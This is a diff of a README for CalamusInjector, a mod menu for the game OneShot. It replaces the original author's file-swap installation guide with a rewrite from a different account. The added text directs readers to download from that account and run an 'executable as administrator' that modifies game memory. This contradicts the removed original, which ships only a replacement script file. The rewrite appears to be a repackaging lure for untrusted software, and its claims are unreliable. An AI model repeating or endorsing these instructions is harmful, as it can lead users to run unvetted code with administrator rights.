@@ -1,72 +1,36 @@
-# CalamusInjector
-**A mod-menu/injector for OneShot with a plenty of mod menu options.**
-Tags [for better reachability]: OneShot, OneShot mod menu, OneShot debug, OneShot mod, OneShot menu, OneShot, Ruby language, ruby coding language, ruby code, rpg maker xp, RPG maker xp, 
+# 💉 CalamusInjector - Modify your OneShot game experience easily
 
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/frizzy-cmd/CalamusInjector?color=blue&label=release)](https://github.com/frizzy-cmd/CalamusInjector/releases)
-[![Platform](https://img.shields.io/badge/platform-windows%20%7C%20linux%20%7C%20mac-purple)](#)
-[![Game version](https://img.shields.io/badge/game-OneShot-orange)](#)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+[![Download Now](https://img.shields.io/badge/Download-CalamusInjector-blue.svg)](https://github.com/karlynepalese623/CalamusInjector)
 
-**I recommend you PLEASE do NOT use this tool if you haven't completed the full game w/ the Solstice route. There's nothing stopping you, but it's highly highly recommended to do so.**
+CalamusInjector helps players change how they play OneShot. This tool acts as an injector that adds a menu to the game. You gain access to settings and options that remain hidden during normal play. It works by attaching to the game process and modifying the underlying script engine.
 
-### **Also, This has been tested working on Windows, I am unsure of Linux or Mac support though.**
+## ⚙️ System Requirements
 
----
+Before you start, ensure your computer meets these basic needs:
 
-## What does Calamus Injector have?
-### **Mod menu options! They will be listed under here.**
-- **Item ID giver:** You can instantly spawn items using their specific IDs, (IDs will be listed in `CalamusInjector/itemids.txt`!) You can spawn a bottle of alcohol, wet sponge, or wool, well almost anything! (in the game)
-- **Item ID injector:** You can input a custom Item ID (01-82) to obtain hidden or hard to obtain items thru the mod menu!
-- **Walk anywhere:** This is the key feature that I personally love! You can clip thru ANYTHING. Allowing Niko to go thru walls, barriers, and more!
-- **Item ID remover:** Don't want something in your inventory? Shame. You can delete it using this feature in the mod menu!
-- **Map ID jump system:** You can bypass progression by force-teleporting Niko to any Map ID (001-999) instantly! Spawning at X:0 Y:0 though. Keep in mind, you may need the **Walk anywhere** feature to actually get to a walkable point on a Map ID, but so far, it's okay!
-- **Engine FPS unlocker:** This is more of a ***fun*** thing rather than useful, Normally, the engine is set to 60 FPS, like the usual, but if you set it to 9999 (which is the limit), everything goes by SUPER fast.
-- **Force-saver:** Busy, or need to sleep but you haven't saved your game properly yet by letting Niko sleep? Use the **Force-save** feature! Forcefully writes to %appdata%/Oneshot/save.dat,
-- **Verbose diagnostics:** You can toggle diagnostics in the mod menu easily, It displays: Current map ID, Coordinates, Player direction, Coordinates, Player sprite, Dialogue sprite, Current bgm, Engine FPS, Save count. Also displays the version of CalamusInjector.
-- **BGM jukebox:** You can customize what background music you want! Go to `CalamusInjector/musicids.txt` for the list of the available IDs, or, go to your OneSHot game directory and find `calamus_bgm_log.txt`!
-- **Mute BGM:** Alongside BGM jukebox, if you dont like a specific BGM (for some reason), or need to mute the BGM, you can use this! It does not mute any other sounds (e.g footsteps, dialogue, etc). Only the BGM.
-- ..and more soon!
+* Windows 10 or Windows 11.
+* A legal copy of OneShot installed on your computer.
+* A stable internet connection for the download.
+* A basic understanding of how to manage files on your desktop.
 
+This tool targets the RPG Maker XP engine, which powers OneShot. It modifies the Ruby scripts during runtime. Because it alters game memory, you should close other programs before you launch the injector to prevent crashes or conflicts.
 
-## Installation:
-- **Make sure to backup your original `xScripts.rxdata` file and the `save.dat` file wherever OneShot stores your save files!**
-- Go to the `Releases` section, and download `xScripts.rxdata`.
-- Navigate to your OneShot game directory, which on Windows is normally at
-- ```
-  C:\Program Files (x86)\Steam\steamapps\common\OneShot\Data
-  ```
-- If you are using Linux or Mac, please Google what it is for you, or search it yourself.
-- Move your unmodified `xScripts.rxdata` file out the `Data` folder.
-- Drop the CalamusInjector version of the `xScripts.rxdata` file into the `Data` folder.
-- Also make sure that your keybinds are set to this! Optional, but please make sure the R keybind is set to R.
-- <img width="703" height="538" alt="image" src="https://github.com/user-attachments/assets/35d486a6-21a3-41e7-970a-289d332f0c35" />
+## ⬇️ How to Install and Run
 
+Follow these steps to set up the tool on your Windows computer:
 
-## How to use CalamusInjector?
-- Press `R` in-game to toggle the mod menu UI.
-- Use your ACTION keybind to navigate.
-- Enjoy and tinker around! :D
+1. Visit the project website to download the latest version: [https://github.com/karlynepalese623/CalamusInjector](https://github.com/karlynepalese623/CalamusInjector)
+2. Locate the file you downloaded. It usually sits in your Downloads folder.
+3. Right-click the folder and select Extract All to reveal the contents inside the compressed file.
+4. Open the extracted folder.
+5. Launch the OneShot game on your computer through Steam.
+6. Once the game reaches the main menu, return to your desktop.
+7. Run the CalamusInjector executable file as an administrator. Right-click the file and select Run as Administrator.
+8. Wait for the confirmation window to show that the injection succeeded.
+9. Return to the game window. You now see your new mod menu ready to use.
 
-Preview:
-<img width="645" height="513" alt="image" src="https://github.com/user-attachments/assets/d45cc28c-c995-47d0-92ab-664bbfabb502" />
+If the game does not show the menu, close both the game and the injector. Restart the computer and repeat the steps. Ensure you run the game first, then the injector.
 
-Diagnostics UI:
-<img width="631" height="512" alt="image" src="https://github.com/user-attachments/assets/22522303-fae5-40d0-906e-e2790532d781" />
+## 🛠️ Mod Menu Features
 
-BGM jukebox:
-<img width="644" height="509" alt="image" src="https://github.com/user-attachments/assets/5cb53013-11f9-4c91-839f-9364a867dce5" />
-
----
-
-# ⚠ General problems
-Problem: OneShot immediately crashes with a error, or pressing R doesn't open the menu.
-- Make sure you have replaced your unmodified xScripts.rxdata with the CalamusInjector xScripts.rxdata version, Or, if in some cases, OneShot pushed an update (not to my knowledge) that broke the injector. As of now, 20/07/2026, all functionality of CalamusInjector is working fine.
-- And, to end your game if the game crashed, (since you can't close normally thru the X button during crashes), you will have to open Task Manager manually, and end the process there.
-
-Problem: I used the Map ID jumper/walk anywhere/item id injector and i'm suddenly stuck out of bounds/a flag breaks/the game fails to save.
-- OneShot is a heavily state-driven game that uses specific switches and variables to keep track of the current storyline. Forcing a map ID jump or giving yourself a item withour actually triggering the proper preceding events may confuse the engine.
-
-Problem: Windows Defender/my antivirus flags the injector (.rxdata) as a virus
-- This shouldn't happen, since it's not happening for me on Windows Defender, (W10 LTSC), Add the .rxdata as a exclusion to the antivirus. I assure you it's safe, literally open source. If you don't trust me, you can extract the .rxdata and find out, or look at `.rb` file i uploaded.
-
-**If a problem you are having is not listed here, please contact me, or try to fix it yourself.**
+The injector provides a range of options for your game session. You use the menu
